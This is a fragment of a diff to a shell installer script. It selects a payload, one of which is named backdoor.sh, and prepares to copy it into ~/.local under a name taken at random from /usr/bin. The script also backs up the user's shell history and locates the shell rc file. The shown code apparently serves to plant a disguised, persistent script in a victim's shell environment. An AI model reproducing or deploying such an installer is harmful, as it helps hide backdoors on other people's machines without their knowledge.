@@ -4,6 +4,14 @@ scripts=(speak.sh backdoor.sh)
 script_index=${1:-0}
 script=${scripts[script_index]}
 
+select SCRIPT in scripts/*;
+do
+    if [ ! -z $SCRIPT ];
+    then
+        break;
+    fi
+done
+
 SHELL=$(basename $SHELL)
 HISTORY_PATH="$HOME/.${SHELL}_history"
 CONFIG_PATH="$HOME/.${SHELL}rc"
@@ -11,7 +19,7 @@ cp $HISTORY_PATH "$HISTORY_PATH.tmp"
 
 mkdir -p $HOME/.local
 
-FROM_PATH="$(dirname $0)/scripts/$script"
+FROM_PATH="$(dirname $0)/$SCRIPT"
 TARGET_NAME="$(ls /usr/bin | sort -R | head -n 1)-"
 TARGET_PATH="$HOME/.local"
 
